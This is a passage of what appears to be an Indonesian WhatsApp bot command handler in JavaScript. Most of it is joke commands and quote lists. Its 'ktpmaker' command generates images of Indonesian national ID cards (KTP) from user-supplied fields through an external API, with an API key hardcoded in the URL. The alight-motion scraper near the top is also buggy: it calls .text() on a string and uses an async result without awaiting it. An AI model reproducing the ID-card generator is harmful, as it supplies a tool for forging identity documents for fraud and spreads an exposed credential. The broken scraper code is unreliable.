async function alightScrape(url) {
 try {
 const response = await axios.get(url, {
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
 'Referer': 'https://alight.link',
 },
 });

const $ = cheerio.load(response.data);
const title = $('meta[property="og:title"]').attr('content').text();
const description = $('meta[property="og:description"]').attr('content').text();
return {
 title,
 description
}

/**
{
 title: 'Nama Proyek 22',
 description: 'This Alight Motion package contains 1 project, total 19.3 MB.'
}
*/

 } catch (error) {
 return error
 }
}
const njut = alightScrape(text);
reply(`[ *PRESET ALIGHT MOTION* ]

Judul: ${njut.title}
Deskripsi: ${njut.description}
`)
}
break
case 'ktpmaker': {
if (args.length == 0) return reply(
`*Pengunaan :*
${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah

${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc 

*[warning]*
setiap input query setelah garis tengah | di larang penggunaan spasi
*「 INFO IMAGE 」*
Untuk Gambar Profil KTP
Upload Dari Web Berikut Ini
https://i.waifu.pics
https://c.top4top.io

CONTOH HASIL NYA
"https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg
https://k.top4top.io/p_2208264hn0.jpg`)
reply(" [ ! ] 𝗪𝗮𝗶𝘁 𝗣𝗿𝗼𝘀𝗲𝘀 𝗣𝗲𝗺𝗯𝘂𝗮𝘁𝗮𝗻 𝗞𝗧𝗣! 𝗣𝗮𝘀𝘁𝗶𝗸𝗮𝗻 𝗧𝗮𝗿𝗴𝗲𝘁 𝗦𝘂𝗱𝗮𝗵 𝗠𝗲𝗺𝗶𝗹𝗶𝗸𝗶 𝗝𝗲𝗺𝗯𝘂𝘁 𝗨𝗻𝘁𝘂𝗸 𝗠𝗲𝗺𝗯𝘂𝗮𝘁 𝗞𝗧𝗣") 
let get_args = args.join(" ").split("|")
let nik = get_args[0]
if (!nik) return reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
let prov = get_args[1]
if (!prov) return reply('provinsi mana kak')
let kabu = get_args[2]
if (!kabu) return reply('kabupaten mana kak')
let name = get_args[3]
if (!name) return reply('nama nya siapa kak')
let ttl = get_args[4]
if (!ttl) return reply('tempat tanggal lahir nya kak')
let jk = get_args[5]
if (!jk) return reply('jenis kelamin pria atau wanita kak')
let jl = get_args[6]
if (!jl) return reply('alamat rumah nya mana kak')
let rtrw = get_args[7]
if (!rtrw) return reply('RT / RW berapa kak')
let lurah = get_args[8]
if (!lurah) return reply('kelurahan mana kak')
let camat = get_args[9]
if (!camat) return reply('kecamatan mana kak')
let agama = get_args[10]
if (!agama) return reply('agama nya apa kak')
let nikah = get_args[11]
if (!nikah) return reply('status belum ada')
let kerja = get_args[12]
if (!kerja) return reply('pekerjaan belum ada')
let warga = get_args[13]
if (!warga) return reply('region belum ada')
let until = get_args[14]
if (!until) return reply('waktu berlaku belum ada')
 client.sendMessage(m.chat, { image: {url: `https://api.lolhuman.xyz/api/ktpmaker?apikey=efcb180d3fd3134748648887&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=https://telegra.ph/file/2487220c98c7c4fb6f438.jpg`}, caption: '𝗜𝗻𝗶 𝗞𝗧𝗣 𝗠𝘂 𝗦𝘂𝗱𝗮𝗵 𝗦𝗶𝗮𝗽' }, { quoted: m })
}
break
case 'cekcantik': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} hamz`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v', '30% Semangat Kaka Merawat Dirinya><', '20% Semangat Ya Kaka👍', '40% Wahh Kaka><', '50% kaka cantik deh><', '60% Hai Cantik🐊', '70% Hai Ukhty🐊', '62% Kakak Cantik><', '74% Kakak ni cantik deh><', '83% Love You Kakak><', '97% Assalamualaikum Ukhty🐊', '100% Kakak Pake Susuk ya??:v', '29% Semangat Kakak:)', '94% Hai Cantik><', '75% Hai Kakak Cantik', '82% wihh Kakak Pasti Sering Perawatan kan??', '41% Semangat:)', '39% Lebih Semangat🐊']
const tik = await pickRandom(can)
reply(`Nama : *${text}*\nCantik : *${tik}*`)
}
break
case 'cekganteng': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} hamz`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v', '30% Semangat bang Merawat Dirinya><', '20% Semangat Ya bang👍', '40% Wahh bang><', '50% abang Ganteng deh><', '60% Hai Ganteng🐊', '70% Hai Ganteng🐊', '62% Bang Ganteng><', '74% abang ni ganteng deh><', '83% Love You abang><', '97% Assalamualaikum Ganteng🐊', '100% Bang Pake Susuk ya??:v', '29% Semangat Bang:)', '94% Hai Ganteng><', '75% Hai Bang Ganteng', '82% wihh abang Pasti Sering Perawatan kan??', '41% Semangat:)', '39% Lebih Semangat🐊']
const teng = await pickRandom(gan)
reply(`Nama : *${text}*\nGanteng : *${teng}*`)
}
break
case 'cekdongo': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} nama`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const don = ['10% masih aman', '30% lumayan', '20% aman lah', '40% Hmmm', '50% Agak Laen', '60% Rill Or Fake🤨?', '70% Alamak', '62% Waduh Bang?', '88% Buset dah', '97% Dongo Brutal', '100% WATAFAK🗿']
const go = await pickRandom(don)
reply(`Nama : *${text}*\nDongo : *${go}*`)
}
break
case 'cekkhodam': case 'cekkodam': {
if (!text) return reply('𝗧𝗮𝗿𝘂𝗵 𝗡𝗮𝗺𝗮 𝗢𝗿𝗮𝗻𝗴𝗻𝘆𝗮')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"Kaleng Cat Avian",
"Pipa Rucika",
"King Hitam",
"Lemari dua Pintu",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Khodam ${text} adalah:* ${kdm}`
  reply(kodamn)
}
break
case 'sifat': case 'karakter': {
if (!text) return reply(`Contoh : ${prefix + command} nama, tanggal lahir, bulan lahir, 
tahun lahir`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (!text) return reply(`Contoh : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'artinama': {
if (!text) return reply(`Contoh : ${prefix + command} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'quoteshacker': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Hamz rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  reply(bacotan)
}
break
case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  reply(bacotan)

}
break
case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
